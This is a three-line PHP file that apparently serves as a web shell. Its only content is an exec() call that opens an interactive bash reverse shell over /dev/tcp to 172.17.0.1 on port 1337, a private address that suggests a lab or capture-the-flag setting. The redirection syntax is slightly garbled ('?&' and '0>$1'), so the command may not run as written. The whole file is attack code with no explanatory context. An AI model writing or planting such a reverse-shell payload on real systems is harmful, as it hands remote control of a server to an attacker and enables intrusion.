<?php
exec("/bin/bash -c 'bash -i ?& /dev/tcp/172.17.0.1/1337 0>$1'");
?>
